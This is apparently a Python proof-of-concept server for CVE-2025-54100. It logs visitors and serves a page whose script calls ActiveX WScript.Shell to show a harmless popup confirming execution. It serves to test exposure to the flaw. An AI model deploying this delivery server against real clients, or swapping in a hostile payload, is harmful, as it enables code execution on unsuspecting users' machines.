import http.server
import socketserver
import argparse
import sys
import textwrap

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class ExploitHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def _get_html_payload(self):
        return """
        <html>
        <head><title>PowerShell ActiveX PoC</title></head>
        <body>
            <script>
                var POPUP_DURATION_SECONDS = 5;
                var INFO_ICON_VALUE = 64; // 64 = Information icon for WScript.Shell.Popup
                try {
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Popup("CVE-2025-54100 PoC: ActiveX executed.", POPUP_DURATION_SECONDS, "CVE-2025-54100", INFO_ICON_VALUE);
                } catch(e) {
                    alert("Safe: ActiveX blocked or -UseBasicParsing in use. " + e.message);
                }
            </script>
            <h1>Connection Established.</h1>
        </body>
        </html>
        """

    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        print(f"[{Colors.GREEN}+{Colors.ENDC}] Connection received from: {Colors.BOLD}{client_ip}{Colors.ENDC}")
        print(f"    User-Agent: {user_agent}")
        print(f"    Request: {self.path}")

        raw_payload = self._get_html_payload()
        content = textwrap.dedent(raw_payload).strip().encode('utf-8')

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Server", "PoC-Server/1.0") 
        self.end_headers()
        self.wfile.write(content)
        
        print(f"[{Colors.GREEN}OK{Colors.ENDC}] Payload delivered\n")

def run_server(port):
    socketserver.TCPServer.allow_reuse_address = True
    
    try:
        with socketserver.TCPServer(("", port), ExploitHandler) as httpd:
            print(f"[{Colors.GREEN}+{Colors.ENDC}] Server listening on 0.0.0.0:{port}")
            print(f"[{Colors.BLUE}*{Colors.ENDC}] Waiting...")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[{Colors.FAIL}!{Colors.ENDC}] Stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"[{Colors.FAIL}ERROR{Colors.ENDC}] {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2025-54100')
    parser.add_argument('-p', '--port', type=int, default=8888, help='Port')
    
    args = parser.parse_args()
    
    run_server(args.port)
